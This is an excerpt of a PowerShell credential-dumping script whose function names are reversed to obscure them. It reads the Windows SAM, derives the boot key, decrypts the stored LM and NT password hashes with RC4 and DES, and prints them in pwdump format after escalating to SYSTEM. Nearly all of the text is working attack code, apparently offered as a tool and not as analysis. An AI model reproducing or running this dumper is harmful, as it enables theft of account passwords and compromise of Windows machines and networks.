...
function 4CRweN([byte[]]$key) {
    ...
    Add-Member -MemberType NoteProperty -Name S $null -PassThru |
    Add-Member -MemberType ScriptMethod -Name init -Value {
        if (-not $this.S) {
            [byte[]]$this.S = 0..255
    ...
    Add-Member -MemberType ScriptMethod -Name encrypt -Value {
        param($data)
        $this.init()
...
function hsaHelgniStpyrceD_4CR($rid, [byte[]]$hbootkey, [byte[]]$enc_hash, [byte[]]$lmntstr) {
    ...
    $hash = (tpyrced_sed  $obfkey[0..7] $deskeys[0]) + (tpyrced_sed $obfkey[8..($obfkey.Length - 1)] $deskeys[1])
    return ,$hash
}
function yeKtooB-teG {
    ...
    $b2 = [byte[]]@(16)
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | ForEach-Object -Begin { $i=0 } { $b2[$i] = $b[$_]; $i++ }
    return ,$b2
}
...
function sehsaHtpyrceD($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey){
    $lmhash = if ($enc_lm_hash.Length -lt 40) { @(0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee) }
              else { hsaHelgniStpyrceD $rid $hbootkey $enc_lm_hash }

    $nthash = if ($enc_nt_hash.Length -lt 40) { @(0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0) }
              else { hsaHelgniStpyrceD $rid $hbootkey $enc_nt_hash }
...
function sehsaHpmuD{
    ...
    syeKresU-teG | ForEach-Object {
        $hashes = sehsaHresU-teG $_ $hBootKey
        "{0}:{1}:{2}:{3}:::" -f $_.UserName, $_.Rid, ([System.BitConverter]::ToString($hashes[0]) -replace "-", "").ToLower(), ([System.BitConverter]::ToString($hashes[1]) -replace "-", "").ToLower()
    }
}
if ([priv]::IsUserAnAdmin()) {
    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {sehsaHpmuD}
    else {GetThosePrivileges
    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {sehsaHpmuD}
    }
}
else {Write-Host "Administrator or System privileges necessary." -ForegroundColor "Red"}
} DumpSAM
